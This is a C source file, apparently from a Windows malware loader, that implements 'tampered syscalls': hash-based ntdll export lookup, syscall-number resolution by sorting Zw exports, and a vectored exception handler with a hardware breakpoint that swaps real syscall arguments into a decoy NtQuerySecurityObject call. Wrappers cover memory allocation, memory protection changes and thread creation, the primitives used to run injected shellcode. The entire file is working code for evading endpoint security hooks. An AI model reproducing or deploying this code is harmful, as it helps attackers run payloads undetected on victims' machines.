#include "TamperedSyscalls.h"
#include "ApiResolve.h"
#include "Config.h"
#include <intrin.h>

typedef struct _SYSCALL_TABLE_ENTRY {
    DWORD  dwHash;
    DWORD  dwSSN;
    PVOID  pSyscallAddr;
} SYSCALL_TABLE_ENTRY;

typedef struct _SYSCALL_TABLE {
    SYSCALL_TABLE_ENTRY entries[MAX_SYSCALL_ENTRIES];
    DWORD               dwCount;
} SYSCALL_TABLE;

static SYSCALL_TABLE          g_SyscallTable = { 0 };
static TAMPERED_SYSCALL_ARGS  g_TamperedArgs = { 0 };
static PVOID                  g_pSyscallInsn = NULL;
static PVOID                  g_pDecoyFunc   = NULL;
static PVOID                  g_hVeh         = NULL;

static DWORD Djb2HashAnsi(const char* str) {
    DWORD hash = 5381;
    int c;
    while ((c = *str++))
        hash = ((hash << 5) + hash) + c;
    return hash;
}

static int CompareEntries(const void* a, const void* b) {
    ULONG_PTR addrA = (ULONG_PTR)((const SYSCALL_TABLE_ENTRY*)a)->pSyscallAddr;
    ULONG_PTR addrB = (ULONG_PTR)((const SYSCALL_TABLE_ENTRY*)b)->pSyscallAddr;
    if (addrA < addrB) return -1;
    if (addrA > addrB) return 1;
    return 0;
}

static PVOID FindSyscallInstruction(PVOID pFuncAddr) {
    BYTE* p = (BYTE*)pFuncAddr;
    for (int i = 0; i < 64; i++) {
        if (p[i] == 0x0F && p[i + 1] == 0x05)
            return &p[i];
    }
    return NULL;
}

static BOOL PopulateSyscallTable(HMODULE hNtdll) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + pDos->e_lfanew);

    DWORD dwExportRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!dwExportRva) return FALSE;

    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hNtdll + dwExportRva);
    DWORD* pNames    = (DWORD*)((BYTE*)hNtdll + pExp->AddressOfNames);
    WORD*  pOrdinals = (WORD*)((BYTE*)hNtdll + pExp->AddressOfNameOrdinals);
    DWORD* pFuncs    = (DWORD*)((BYTE*)hNtdll + pExp->AddressOfFunctions);

    g_SyscallTable.dwCount = 0;

    for (DWORD i = 0; i < pExp->NumberOfNames && g_SyscallTable.dwCount < MAX_SYSCALL_ENTRIES; i++) {
        const char* szName = (const char*)((BYTE*)hNtdll + pNames[i]);

        if (szName[0] == 'Z' && szName[1] == 'w') {
            PVOID pAddr = (PVOID)((BYTE*)hNtdll + pFuncs[pOrdinals[i]]);

            char szNtName[256];
            szNtName[0] = 'N'; szNtName[1] = 't';
            int j = 2;
            while (szName[j] && j < 255) { szNtName[j] = szName[j]; j++; }
            szNtName[j] = '\0';

            DWORD idx = g_SyscallTable.dwCount;
            g_SyscallTable.entries[idx].dwHash      = Djb2HashAnsi(szNtName);
            g_SyscallTable.entries[idx].pSyscallAddr = pAddr;
            g_SyscallTable.entries[idx].dwSSN        = 0;
            g_SyscallTable.dwCount++;
        }
    }

    qsort(g_SyscallTable.entries, g_SyscallTable.dwCount,
          sizeof(SYSCALL_TABLE_ENTRY), CompareEntries);

    for (DWORD i = 0; i < g_SyscallTable.dwCount; i++)
        g_SyscallTable.entries[i].dwSSN = i;

    return g_SyscallTable.dwCount > 0;
}

DWORD GetSSN(DWORD dwFunctionHash) {
    for (DWORD i = 0; i < g_SyscallTable.dwCount; i++) {
        if (g_SyscallTable.entries[i].dwHash == dwFunctionHash)
            return g_SyscallTable.entries[i].dwSSN;
    }
    return (DWORD)-1;
}

static LONG NTAPI VehHandler(PEXCEPTION_POINTERS pExInfo) {
    if (pExInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        if ((ULONG_PTR)pExInfo->ExceptionRecord->ExceptionAddress == (ULONG_PTR)g_pSyscallInsn) {
            pExInfo->ContextRecord->Rax = (DWORD64)g_TamperedArgs.dwSSN;
            pExInfo->ContextRecord->R10 = (DWORD64)g_TamperedArgs.Arg1;
            pExInfo->ContextRecord->Rdx = (DWORD64)g_TamperedArgs.Arg2;
            pExInfo->ContextRecord->R8  = (DWORD64)g_TamperedArgs.Arg3;
            pExInfo->ContextRecord->R9  = (DWORD64)g_TamperedArgs.Arg4;

            pExInfo->ContextRecord->EFlags |= (1 << 16); /* RF: suppress breakpoint for one instruction */

            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

static BOOL SetHardwareBreakpoint(PVOID pAddress) {
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    HANDLE hThread = GetCurrentThread();
    if (!GetThreadContext(hThread, &ctx))
        return FALSE;

    ctx.Dr0 = (DWORD64)pAddress;
    ctx.Dr7 = (ctx.Dr7 & ~0xF) | 0x1;

    return SetThreadContext(hThread, &ctx);
}

static void ClearHardwareBreakpoint(void) {
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    HANDLE hThread = GetCurrentThread();
    if (GetThreadContext(hThread, &ctx)) {
        ctx.Dr0 = 0;
        ctx.Dr7 &= ~0x1;
        SetThreadContext(hThread, &ctx);
    }
}

typedef NTSTATUS(NTAPI* fnDecoy)(
    ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR,
    ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR,
    ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR
);

static NTSTATUS InvokeTamperedSyscall(
    DWORD       dwFuncHash,
    ULONG_PTR   arg1, ULONG_PTR arg2, ULONG_PTR arg3, ULONG_PTR arg4,
    ULONG_PTR   arg5, ULONG_PTR arg6, ULONG_PTR arg7, ULONG_PTR arg8,
    ULONG_PTR   arg9, ULONG_PTR arg10, ULONG_PTR arg11
) {
#if ENABLE_TAMPERED_SYSCALLS
    DWORD dwSSN = GetSSN(dwFuncHash);
    if (dwSSN == (DWORD)-1)
        return (NTSTATUS)0xC0000001;

    g_TamperedArgs.dwSSN = dwSSN;
    g_TamperedArgs.Arg1  = arg1;
    g_TamperedArgs.Arg2  = arg2;
    g_TamperedArgs.Arg3  = arg3;
    g_TamperedArgs.Arg4  = arg4;

    SetHardwareBreakpoint(g_pSyscallInsn);

    NTSTATUS status = ((fnDecoy)g_pDecoyFunc)(
        0, 0, 0, 0,
        arg5, arg6, arg7, arg8,
        arg9, arg10, arg11, 0
    );

    ClearHardwareBreakpoint();

    return status;
#else
    (void)dwFuncHash; (void)arg1; (void)arg2; (void)arg3; (void)arg4;
    (void)arg5; (void)arg6; (void)arg7; (void)arg8;
    (void)arg9; (void)arg10; (void)arg11;
    return (NTSTATUS)0xC0000001;
#endif
}

BOOL InitTamperedSyscalls(void) {
    HMODULE hNtdll = GetModuleByHash(HASH_NTDLL);
    if (!hNtdll) return FALSE;

    if (!PopulateSyscallTable(hNtdll))
        return FALSE;

    g_pDecoyFunc = (PVOID)GetProcByHash(hNtdll, HASH_NtQuerySecurityObject);
    if (!g_pDecoyFunc)
        return FALSE;

    g_pSyscallInsn = FindSyscallInstruction(g_pDecoyFunc);
    if (!g_pSyscallInsn)
        return FALSE;

    fnRtlAddVectoredExceptionHandler pAddVeh = (fnRtlAddVectoredExceptionHandler)
        GetProcByHash(hNtdll, 0x554BAFA9);
    if (!pAddVeh)
        return FALSE;

    g_hVeh = pAddVeh(1, VehHandler);
    return (g_hVeh != NULL);
}

void CleanupTamperedSyscalls(void) {
    ClearHardwareBreakpoint();
    if (g_hVeh) {
        HMODULE hNtdll = GetModuleByHash(HASH_NTDLL);
        if (hNtdll) {
            fnRtlRemoveVectoredExceptionHandler pRemoveVeh =
                (fnRtlRemoveVectoredExceptionHandler)GetProcByHash(hNtdll, 0x880C210E);
            if (pRemoveVeh) pRemoveVeh(g_hVeh);
        }
        g_hVeh = NULL;
    }
    SecureZeroMemory(&g_TamperedArgs, sizeof(g_TamperedArgs));
}

NTSTATUS TamperedNtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect
) {
    return InvokeTamperedSyscall(
        HASH_NtAllocateVirtualMemory,
        (ULONG_PTR)ProcessHandle, (ULONG_PTR)BaseAddress,
        (ULONG_PTR)ZeroBits, (ULONG_PTR)RegionSize,
        (ULONG_PTR)AllocationType, (ULONG_PTR)Protect,
        0, 0, 0, 0, 0
    );
}

NTSTATUS TamperedNtProtectVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress,
    PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect
) {
    return InvokeTamperedSyscall(
        HASH_NtProtectVirtualMemory,
        (ULONG_PTR)ProcessHandle, (ULONG_PTR)BaseAddress,
        (ULONG_PTR)RegionSize, (ULONG_PTR)NewProtect,
        (ULONG_PTR)OldProtect, 0, 0, 0, 0, 0, 0
    );
}

NTSTATUS TamperedNtCreateThreadEx(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument,
    ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize,
    SIZE_T MaximumStackSize, PVOID AttributeList
) {
    return InvokeTamperedSyscall(
        HASH_NtCreateThreadEx,
        (ULONG_PTR)ThreadHandle, (ULONG_PTR)DesiredAccess,
        (ULONG_PTR)ObjectAttributes, (ULONG_PTR)ProcessHandle,
        (ULONG_PTR)StartRoutine, (ULONG_PTR)Argument,
        (ULONG_PTR)CreateFlags, (ULONG_PTR)ZeroBits,
        (ULONG_PTR)StackSize, (ULONG_PTR)MaximumStackSize,
        (ULONG_PTR)AttributeList
    );
}

NTSTATUS TamperedNtWaitForSingleObject(
    HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout
) {
    return InvokeTamperedSyscall(
        HASH_NtWaitForSingleObject,
        (ULONG_PTR)Handle, (ULONG_PTR)Alertable,
        (ULONG_PTR)Timeout, 0, 0, 0, 0, 0, 0, 0, 0
    );
}

NTSTATUS TamperedNtFreeVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress,
    PSIZE_T RegionSize, ULONG FreeType
) {
    return InvokeTamperedSyscall(
        HASH_NtFreeVirtualMemory,
        (ULONG_PTR)ProcessHandle, (ULONG_PTR)BaseAddress,
        (ULONG_PTR)RegionSize, (ULONG_PTR)FreeType,
        0, 0, 0, 0, 0, 0, 0
    );
}
